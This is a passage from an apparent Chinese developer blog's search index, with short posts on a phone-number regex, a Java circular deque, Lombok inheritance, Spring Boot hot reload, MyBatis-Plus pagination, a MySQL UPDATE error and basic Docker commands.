string">'1787878787878'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以若是采用这种写法，应当在每个小括号内都加上<code>^</code>和<code>$</code>。</p><p><strong>或者采用这种更完善的写法 <code>/^1[3-9][0-9]&#123;9&#125;$/</code></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>设计循环双端队列</title>
      <link href="/2022/08/15/%E8%AE%BE%E8%AE%A1%E5%BE%AA%E7%8E%AF%E5%8F%8C%E7%AB%AF%E9%98%9F%E5%88%97/"/>
      <url>/2022/08/15/%E8%AE%BE%E8%AE%A1%E5%BE%AA%E7%8E%AF%E5%8F%8C%E7%AB%AF%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计实现双端队列。</p><p>实现 <code>MyCircularDeque</code> 类:</p><ul><li><code>MyCircularDeque(int k)</code> ：构造函数,双端队列最大为 k 。</li><li><code>boolean insertFront(int value)</code>：将一个元素添加到双端队列头部。 如果操作成功返回 true ，否则返回 false 。</li><li><code>boolean insertLast(int value)</code> ：将一个元素添加到双端队列尾部。如果操作成功返回 true ，否则返回 false 。</li><li><code>boolean deleteFront()</code> ：从双端队列头部删除一个元素。 如果操作成功返回 true ，否则返回 false 。</li><li><code>boolean deleteLast()</code> ：从双端队列尾部删除一个元素。如果操作成功返回 true ，否则返回 false 。</li><li><code>int getFront() )</code>：从双端队列头部获得一个元素。如果双端队列为空，返回 -1 。</li><li><code>int getRear()</code> ：获得双端队列的最后一个元素。 如果双端队列为空，返回 -1 。</li><li><code>boolean isEmpty()</code> ：若双端队列为空，则返回 true ，否则返回 false 。</li><li><code>boolean isFull()</code> ：若双端队列满了，则返回 true ，否则返回 false 。</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ol><li>head 前插索引指向当前位，tail 尾插索引指向待插位</li><li>队列初始化大小使用 k+1，方便进行判空和判满</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">MyCircularDeque</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> head<span class="token punctuation">;</span>    <span class="token keyword">int</span> tail<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> elem<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MyCircularDeque</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">insertFront</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                elem<span class="token punctuation">[</span>head <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">+</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">%</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">insertLast</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            elem<span class="token punctuation">[</span>tail<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>            tail <span class="token operator">=</span> <span class="token punctuation">(</span>tail <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">deleteFront</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            head <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">deleteLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            tail <span class="token operator">=</span> <span class="token punctuation">(</span>tail <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">+</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">%</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getFront</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>elem<span class="token punctuation">[</span>head<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getRear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>elem<span class="token punctuation">[</span><span class="token punctuation">(</span>tail <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">+</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">%</span> elem<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> head <span class="token operator">==</span> tail<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>tail <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> elem<span class="token punctuation">.</span>length <span class="token operator">==</span> head<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lombok继承父类时的问题</title>
      <link href="/2022/08/09/lombok%E7%BB%A7%E6%89%BF%E7%88%B6%E7%B1%BB%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/08/09/lombok%E7%BB%A7%E6%89%BF%E7%88%B6%E7%B1%BB%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>使用Lombok时，在继承关系中，子类使用@Data注解，产生的ToString()方法不包含父类的属性。</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p><code>lombok.Data</code>是默认使用<code>lombok.EqualsAndHashCode</code> 和 <code>lombok.ToString</code>。而这两种注解有一个参数<code>callSuper</code> 默认是false，即默认不适用父类。</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>添加<code>@ToString(callSuper = true)</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>springboot项目热部署</title>
      <link href="/2022/08/08/springboot%E9%A1%B9%E7%9B%AE%E7%83%AD%E9%83%A8%E7%BD%B2/"/>
      <url>/2022/08/08/springboot%E9%A1%B9%E7%9B%AE%E7%83%AD%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>这里使用 springboot-devtools</p><ol><li><p>导入坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-devtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时热部署已经生效，但是还需要手动点击<code>Build project</code>或者按快捷键<code>Ctrl+F9</code>来让 idea 重新构建项目(编译修改后的类)</p><h3 id="开启自动构建："><a href="#开启自动构建：" class="headerlink" title="开启自动构建："></a>开启自动构建：</h3></li><li><p>在 idea 中开启<code>Settings -&gt; Complier -&gt; Build project automatically</code></p><blockquote><p>idea 版本：2022.2</p></blockquote></li><li><p>开启<code>Settings -&gt; Advanced Settings -&gt; Allow auto-make to start even if developed application is currently running</code></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用MultipartFile的transferTo()方法时，关于相对路径的问题</title>
      <link href="/2022/07/28/%E4%BD%BF%E7%94%A8MultipartFile%E7%9A%84transferTo-%E6%96%B9%E6%B3%95%E6%97%B6%EF%BC%8C%E5%85%B3%E4%BA%8E%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/07/28/%E4%BD%BF%E7%94%A8MultipartFile%E7%9A%84transferTo-%E6%96%B9%E6%B3%95%E6%97%B6%EF%BC%8C%E5%85%B3%E4%BA%8E%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> 异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring使用mybatis-plus 3.4.0+ 的分页查询</title>
      <link href="/2022/06/01/spring%E6%95%B4%E5%90%88mybatis-plus-3-4-0%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2/"/>
      <url>/2022/06/01/spring%E6%95%B4%E5%90%88mybatis-plus-3-4-0%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<p>在 Mybatis-plus3.4.0 之前，使用 paginationInterceptor 来进行拦截</p><p>自 3.4.0 版本后，都是使用<code>MybatisPlusInterceptor</code> 内注入<code>PaginationInnerInterceptor</code>来进行的拦截</p><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.baomidou<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis-plus<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><blockquote><p>注意：此处一定要把分页插件配入 SQLSessionFactory 内部的 plugins</p></blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--配置MyBatis的SqlSessionFactory--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sqlSessionFactory<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>plugins<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>interceptors<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelectPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Page</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> page <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Page</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">QueryWrapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> wrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryWrapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrapper<span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    userMapper<span class="token punctuation">.</span><span class="token function">selectPage</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取页数</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>page<span class="token punctuation">.</span><span class="token function">getPages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取总数据条数</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>page<span class="token punctuation">.</span><span class="token function">getTotal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取当前页</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>page<span class="token punctuation">.</span><span class="token function">getCurrent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 遍历结果</span>    page<span class="token punctuation">.</span><span class="token function">getRecords</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title> Data truncation: Truncated incorrect DOUBLE value</title>
      <link href="/2022/05/14/Data-truncation-Truncated-incorrect-DOUBLE-value/"/>
      <url>/2022/05/14/Data-truncation-Truncated-incorrect-DOUBLE-value/</url>
      
        <content type="html"><![CDATA[<p>使用 update 语句时，出现 Data truncation: Truncated incorrect DOUBLE value</p><pre class="line-numbers language-none"><code class="language-none">org.springframework.dao.DataIntegrityViolationException: PreparedStatementCallback; SQL [update t_user set uname&#x3D;? and usex&#x3D;? and uemail&#x3D;? and upassword&#x3D;? where uid&#x3D;?]; Data truncation: Truncated incorrect DOUBLE value: &#39;王五&#39;; nested exception is com.mysql.cj.jdbc.exceptions.MysqlDataTruncation: Data truncation: Truncated incorrect DOUBLE value: &#39;王五&#39;org.springframework.jdbc.support.SQLStateSQLExceptionTranslator.doTranslate(SQLStateSQLExceptionTranslator.java:104)org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:70)org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:79)org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:79)org.springframework.jdbc.core.JdbcTemplate.translateException(JdbcTemplate.java:1541)org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:667)org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:960)org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:1015)org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:1025)org.apache.jsp.doUpdateUser_jsp._jspService(doUpdateUser_jsp.java:138)org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)javax.servlet.http.HttpServlet.service(HttpServlet.java:764)org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:465)org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:383)org.apache.jasper.servlet.JspServlet.service(JspServlet.java:331)javax.servlet.http.HttpServlet.service(HttpServlet.java:764)org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也许你只是语句写错了，update 语句中想要更新多个字段的值，应该使用逗号而不是 and 连接</p>]]></content>
      
      
      
        <tags>
            
            <tag> 异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2022/05/07/docker/"/>
      <url>/2022/05/07/docker/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h2><p><img src="/2022/05/07/docker/1.png"></p><ul><li><p>镜像(Image)</p><p>Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</p></li><li><p>容器（Container）：</p><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p></li><li><p>仓库（Repository）</p><p>仓库可看成一个代码控制中心，用来保存镜像。</p></li></ul><h2 id="Docker-命令"><a href="#Docker-命令" class="headerlink" title="Docker 命令"></a>Docker 命令</h2><h3 id="进程相关"><a href="#进程相关" class="headerlink" title="进程相关"></a>进程相关</h3><ul><li><p>启动 docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>停止 docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl stop <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>重启 docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看状态</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置开机启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h3><ul><li><p>查看镜像：查看本地所有镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> images<span class="token function">docker</span> images -q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>搜索镜像：从网络中查找需要的镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> search 镜像名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>拉取镜像：从 Docker 仓库下载镜像到本地，镜像名称格式为名称:版本号，如果版本号不指定则是最新的版本。如果不知道镜像版本，可以去 docker hub 搜索对应镜像查看。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull 镜像名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>删除镜像：删除本地镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> rmi 镜像id  <span class="token comment"># 删除指定本地镜像</span><span class="token function">docker</span> rmi <span class="token variable"><span class="token variable">`</span><span class="token function">docker</span> images -q<span class="token variable">`</span></span> <span class="token comment"># 删除所有本地镜像</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><ul><li><p>查看容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">ps</span>    <span class="token comment"># 查看正在运行的容器</span><span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment"># 查看所有容器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>创建并启动容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run 参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明：</p><ul><li><p>-i：保持容器运行。通常与-t 同时使用。加入 it 这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭。</p></li><li><p>-t：为容器重新分配一个伪输入终端，通常与-i 同时使用。</p><p>-it 创建的容器一般称为交互式容器</p></li><li><p>-d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用 docker exec 进入容器。退出后，容器不会关闭。</p><p>-id 创建的容器一般称为守护式容器</p></li><li><p>–name：为创建的容器命名。</p></li></ul></li><li><p>进入容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> 容器名称   <span class="token comment"># 退出容器，容器不会关闭</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>停止容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> stop 容器名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>启动容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> start 容器名称<span aria-hidden="true" 